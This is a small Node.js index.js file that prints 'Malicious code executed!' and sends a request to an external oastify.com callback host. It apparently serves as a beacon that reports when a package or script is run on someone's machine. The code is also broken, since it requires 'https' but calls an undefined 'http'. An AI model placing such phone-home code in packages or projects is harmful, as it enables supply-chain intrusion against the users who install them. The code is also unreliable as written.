// index.js

console.log("Malicious code executed!");

// Import the 'http' module
const https = require('https');

// Define the data to be sent in the HTTP request
const data = JSON.stringify({ message: 'Malicious code executed!' });

// Configure the options for the HTTP request
const options = {
  hostname: 'xopkckkuz01o0mk6v01roc6o6fc601oq.oastify.com',
  port: 443,
  path: '/masaq',
  method: 'GET',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length,
  },
};

// Create an HTTP request object
const req = http.request(options, (res) => {
  // Log the status code of the response
  console.log(`Response status code: ${res.statusCode}`);
  
  // Listen for data events on the response (if any)
  res.on('data', (d) => {
    // Log any data received from the server
    console.log('Response data:', d.toString());
  });
});

// Listen for errors on the request
req.on('error', (e) => {
  // Log any errors that occur during the request
  console.error('Error during HTTP request:', e);
});

// Write the data to the request body and end the request
req.write(data);
req.end();
